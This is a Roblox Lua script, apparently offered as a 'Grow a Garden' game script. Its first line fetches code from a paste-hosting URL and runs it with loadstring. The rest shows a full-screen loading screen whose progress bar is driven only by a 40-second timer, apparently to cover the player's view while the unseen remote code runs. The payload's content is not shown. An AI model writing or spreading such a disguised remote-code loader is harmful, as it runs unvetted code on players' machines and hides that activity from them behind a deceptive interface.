
loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/ylG4b1GmhNS7J1RC/raw", true))()
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Create GUI
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "LoadingScreen"
screenGui.ResetOnSpawn = false
screenGui.IgnoreGuiInset = true
screenGui.Parent = playerGui

-- Gradient background
local gradientFrame = Instance.new("Frame")
gradientFrame.Size = UDim2.new(1, 0, 1, 0)
gradientFrame.BackgroundColor3 = Color3.new(1, 1, 1)
gradientFrame.Parent = screenGui

local gradient = Instance.new("UIGradient")
gradient.Color = ColorSequence.new({
	ColorSequenceKeypoint.new(0, Color3.new(0, 0, 0)),
	ColorSequenceKeypoint.new(1, Color3.new(1, 1, 1)),
})
gradient.Rotation = 90
gradient.Parent = gradientFrame

-- Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 60)
title.Position = UDim2.new(0, 0, 0.4, 0)
title.BackgroundTransparency = 1
title.Text = "ðŸŒ´ GROW A\nGARDEN ðŸŒ´"
title.Font = Enum.Font.GothamBlack
title.TextColor3 = Color3.new(1, 1, 1)
title.TextScaled = true
title.TextStrokeTransparency = 0.5
title.TextYAlignment = Enum.TextYAlignment.Top
title.Parent = gradientFrame

-- Subtext
local subtext = Instance.new("TextLabel")
subtext.Size = UDim2.new(1, 0, 0, 30)
subtext.Position = UDim2.new(0, 0, 0.53, 0)
subtext.BackgroundTransparency = 1
subtext.Text = "Script Is Loading Please Wait for a While"
subtext.Font = Enum.Font.Gotham
subtext.TextColor3 = Color3.fromRGB(230, 230, 230)
subtext.TextScaled = true
subtext.Parent = gradientFrame

-- Progress bar background
local progressBg = Instance.new("Frame")
progressBg.Size = UDim2.new(0.6, 0, 0.025, 0)
progressBg.Position = UDim2.new(0.2, 0, 0.61, 0)
progressBg.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
progressBg.BorderSizePixel = 0
progressBg.Parent = gradientFrame
progressBg.ClipsDescendants = true
progressBg.AnchorPoint = Vector2.new(0.5, 0.5)

-- Progress bar fill
local progressBar = Instance.new("Frame")
progressBar.Size = UDim2.new(0, 0, 1, 0)
progressBar.Position = UDim2.new(0, 0, 0, 0)
progressBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
progressBar.BorderSizePixel = 0
progressBar.Parent = progressBg

-- Percentage Text
local percentLabel = Instance.new("TextLabel")
percentLabel.Size = UDim2.new(1, 0, 0, 30)
percentLabel.Position = UDim2.new(0, 0, 0.63, 0)
percentLabel.BackgroundTransparency = 1
percentLabel.Text = "7%"
percentLabel.Font = Enum.Font.GothamBold
percentLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
percentLabel.TextScaled = true
percentLabel.Parent = gradientFrame

-- Start loading bar logic
local duration = 40 -- seconds
local startTime = tick()
local percent = 7 -- Starting from 7%

-- Tween for smooth fill
TweenService:Create(progressBar, TweenInfo.new(duration), {
	Size = UDim2.new(1, 0, 1, 0)
}):Play()

-- Update percent text
while percent < 100 do
	local elapsed = tick() - startTime
	percent = math.clamp(7 + ((elapsed / duration) * 93), 7, 100)
	percentLabel.Text = string.format("%d%%", percent)
	wait(0.1)
end

-- Done loading - fade out GUI
wait(0.5)
local fadeTween = TweenService:Create(gradientFrame, TweenInfo.new(1), {BackgroundTransparency = 1})
fadeTween:Play()

for _, child in pairs(gradientFrame:GetChildren()) do
	if child:IsA("TextLabel") or child:IsA("Frame") then
		TweenService:Create(child, TweenInfo.new(1), {TextTransparency = 1, BackgroundTransparency = 1}):Play()
	end
end

fadeTween.Completed:Wait()
screenGui:Destroy()
